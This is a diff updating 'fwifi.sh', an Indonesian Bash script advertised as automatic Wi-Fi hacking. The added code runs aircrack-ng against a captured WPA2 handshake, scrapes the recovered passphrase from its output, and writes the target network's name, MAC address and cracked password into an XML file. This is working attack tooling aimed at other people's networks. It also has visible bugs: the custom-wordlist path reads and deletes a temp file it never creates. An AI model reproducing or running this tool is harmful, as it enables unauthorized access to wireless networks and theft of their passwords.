@@ -3,6 +3,7 @@
 #
 # * fwifi.sh
 # * Script Bash untuk Hack Wi-Fi secara otomatis.
+# * Versi: v1.1
 # * Dibuat oleh: Rofi (Fixploit03)
 # * Github: https://github.com/fixploit03/fwifi
 #
@@ -20,11 +21,13 @@
 function cek_root(){
         if [[ $EUID -ne 0 ]]; then
                 echo "[-] Script ini harus dijalankan sebagai root."
+                echo "[-] Keluar."
                 exit 1
         fi
 }
 
 # Fungsi untuk cek alat (OK)
+# next mau adain cara install tools nya *
 function cek_alat(){
 
         daftar_alat_yang_belum_terinstal=()
@@ -63,7 +66,7 @@ function cek_alat(){
 
 }
 
-# Fungsi untuk cek folder yang digunakan sebagai tempan menyimpan hasil capture handshake (OK)
+# Fungsi untuk cek folder yang digunakan sebagai tempan menyimpan hasil capture handshake dan hasil crack (OK)
 function cek_folder(){
         nama_folder="hasil capturte"
         if [[ ! -d "${nama_folder}" ]]; then
@@ -72,14 +75,27 @@ function cek_folder(){
                 mkdir "${nama_folder}"
                 if [[ $? -eq 0 ]]; then
                         echo "[+] Folder '${nama_folder}' berhasil dibuat."
-                        echo "[*] Tunggu beberapa saat."
-                        sleep 3
                 else
                         echo "[-] Folder '${nama_folder}' gagal dibuat."
                         echo "[-] Keluar."
                         exit 1
                 fi
         fi
+        folder_hasil_crack="hasil crack"
+        if [[ ! -d "${folder_hasil_crack}" ]]; then
+                echo "[*] Folder '${folder_hasil_crack}' belum ada."
+                echo "[*] Membuat folder '${folder_hasil_crack}'..."
+                mkdir "${folder_hasil_crack}"
+                if [[ $? -eq 0 ]]; then
+                        echo "[+] Folder '${folder_hasil_crack}' berhasil dibuat."
+                else
+                        echo "[-] Folder '${folder_hasil_crack}' gagal dibuat."
+                        echo "[-] Keluar."
+                        exit 1
+                fi
+        fi
+        echo "[*] Tunggu sebentar..."
+        sleep 3
 }
 
 # Fungsi untuk menampilkan waktu saat ini dalam bahasa indonesia (OK)
@@ -150,11 +166,12 @@ function show_banner(){
         echo "█████╗  ██║ █╗ ██║██║█████╗  ██║"
         echo "██╔══╝  ██║███╗██║██║██╔══╝  ██║"
         echo "██║     ╚███╔███╔╝██║██║     ██║"
-        echo "╚═╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝"
-        echo ""
+        echo "╚═╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝ v1.1"
+        echo "-------------------------------------------------"
         echo "[*] Script Bash untuk Hack Wi-Fi secara otomatis."
         echo "[*] Dibuat oleh: Rofi (Fixploit03)"
         echo "[*] Github: https://github.com/fixploit03/fwifi"
+        echo "-------------------------------------------------"
         echo ""
 }
 
@@ -221,7 +238,7 @@ function scan_target(){
         echo ""
 }
 
-# Fungsi untuk menangkap handshake yang nantinya bakal dicrack pake aircrack
+# Fungsi untuk menangkap handshake yang nantinya bakal dicrack pake aircrack (OK)
 function capture_handshake(){
         # set ssid (OK)
         # ESSID itu nama dari Wi-Fi nya
@@ -238,7 +255,7 @@ function capture_handshake(){
         # set bssid (OK)
         # BSSID itu alamat MAC dari si AP (Access Point) misalnya 'AB:11:GG:11:34:11'
         while true; do
-                read -p "[#] Masukkan BSSID target yang ingin diserang: " bssid_target
+                read -p "[#] Masukkan BSSID (Alamat MAC dari ESSID) yang ingin diserang: " bssid_target
                 if [[ -z "${bssid_target}" ]]; then
                         echo "[-] BSSID tidak boleh kosong."
                         continue
@@ -349,13 +366,84 @@ function clean_up(){
 
 }
 
+# Fungsi untuk menyimpan hasil crack Wi-Fi (OK)
+function save_hasil_crack(){
+        while true; do
+                read -p "[#] Mau simpan hasil proses crack Wi-Fi [Y/n]: " nanya_save
+                if [[ "${nanya_save}" == "y" || "${nanya_save}" == "Y" ]]; then
+                        while true; do
+                                read -p "[#] Masukkan nama file untuk meyimpan hasil proses crack Wi-Fi (tanpa ekstensi): " file_crack
+                                if [[ -z "${file_crack}" ]]; then
+                                        echo "[-] Nama file tidak boleh kosong."
+                                        continue
+                                else
+                                        fc="${file_crack}.xml"
+                                        echo "[+] Nama file untuk meyimpan hasil proses crack Wi-Fi -> ${fc}"
+                                        echo "[*] Membuat file '${fc}'..."
+                                        sleep 3
+                                        touch "${fc}"
+                                        path_hc="${folder_hasil_crack}/${fc}"
+                                        if [[ $? -eq 0 ]]; then
+                                                echo "[+] File '${fc}' berhasil dibuat."
+                                                echo "[*] Menyimpan semua data hasil crack Wi-Fi kedalam file '${fc}'..."
+                                                sleep 3
+                                                if [[ "${nanya_wordlist}" == "y" || "${nanya_wordlist}" == "Y" ]]; then
+                                                        wordlist="${rockyou}"
+                                                elif [[ "${nanya_wordlist}" == "n" || "${nanya_wordlist}" == "N" ]]; then
+                                                        wordlist="${file_wordlist}"
+                                                fi
+                                                cat <<EOF > "${path_hc}"
+<?xml version="1.0" encoding="UTF-8"?>
+<hasil_crack_wifi>
+        <data>
+                <ESSID>${essid_target}</ESSID>
+                <BSSID>${bssid_target}</BSSID>
+                <Channel>${channel_target}</Channel>
+                <Durasi_Capture_Handshake>${lama_waktu}</Durasi_Capture_Handshake>
+                <File_Capture>${path}-01.cap</File_Capture>
+                <File_Wordlist>${wordlist}</File_Wordlist>
+                <Passphrase>${password_wifi}</Passphrase>
+                <Waktu_Crack>
+                        <Hari>${h}</Hari>
+                        <Tanggal>${g}</Tanggal>
+                        <Bulan>${b}</Bulan>
+                        <Tahun>${t}</Tahun>
+                        <Jam>${j}</Jam>
+                </Waktu_Crack>
+        </data>
+</hasil_crack_wifi>
+EOF
+                                                echo "[+] Semua data hasil crack Wi-Fi disimpan di: '${path_hc}'"
+                                                break
+                                        else
+                                                echo "[-] File '${fc}' gagal dibuat."
+                                                echo "[-] Keluar."
+                                                exit 1
+                                        fi
+                                fi
+                        done
+                        break
+                else
+                        echo "[-] Masukkan tidak valid. Harap masukkan 'Y/n'."
+                        continue
+                fi
+        done
+}
+
+
 # Fungsi untuk mengcrack WPA2/PSK passphrase (OK)
 function crack_passpharase(){
         rockyou="/usr/share/wordlists/rockyou.txt"
+        h="${hari}"
+        g="${tanggal}"
+        b="${bulan}"
+        t="${tahun}"
+        j="${jam}"
+
         while true; do
                 read -p "[#] Mau menggunakan file Wordlist default '${rockyou}' [Y/n]: " nanya_wordlist
                 if [[ -z "${nanya_wordlist}" ]]; then
-                        echo "[-] Input tidak boleh kosong. Harap masukkan 'Y/n'."
+                        echo "[-] Masukkan tidak boleh kosong. Harap masukkan 'Y/n'."
                         continue
                 fi
                 if [[ "${nanya_wordlist}" == "y" || "${nanya_wordlist}" == "Y" ]]; then
@@ -365,8 +453,13 @@ function crack_passpharase(){
                         fi
                         echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist '${rockyou}'..."
                         sleep 3
-                        aircrack-ng -a2 "${path}-01.cap" -w "${rockyou}" -b "${bssid_target}" -e "${essid_target}"
+                        aircrack-ng -a2 "${path}-01.cap" -w "${rockyou}" -b "${bssid_target}" -e "${essid_target}" | tee "tmp.txt"
+                        if cat "tmp.txt" | grep -qi "found"; then
+                                password_wifi=$(grep -oP "KEY FOUND! \[ \K[^\]]*" "tmp.txt" | uniq)
+                        fi
                         echo "[*] Proses crack WPA2/PSK passphrase selesai."
+                        rm "tmp.txt"
+                        save_hasil_crack
                         clean_up
                         break
                 elif [[ "${nanya_wordlist}" == "n" || "${nanya_wordlist}" == "N" ]]; then
@@ -383,13 +476,18 @@ function crack_passpharase(){
                                 echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist '${file_wordlist}'..."
                                 sleep 3
                                 aircrack-ng  -a2 "${path}-01.cap" -w "${file_wordlist}" -b "${bssid_target}" -e "${essid_target}"
+                                if cat "tmp.txt" | grep -qi "found"; then
+                                        password_wifi=$(grep -oP "KEY FOUND! \[ \K[^\]]*" "tmp.txt" | uniq)
+                                fi
                                 echo "[*] Proses crack WPA2/PSK passphrase selesai."
+                                rm "tmp.txt"
+                                save_hasil_crack
                                 clean_up
                                 break
                         done
                         break
                 else
-                        echo "[-] Input tidak valid. Harap masukkan 'Y/n'."
+                        echo "[-] Masukkan tidak valid. Harap masukkan 'Y/n'."
                         continue
                 fi
         done
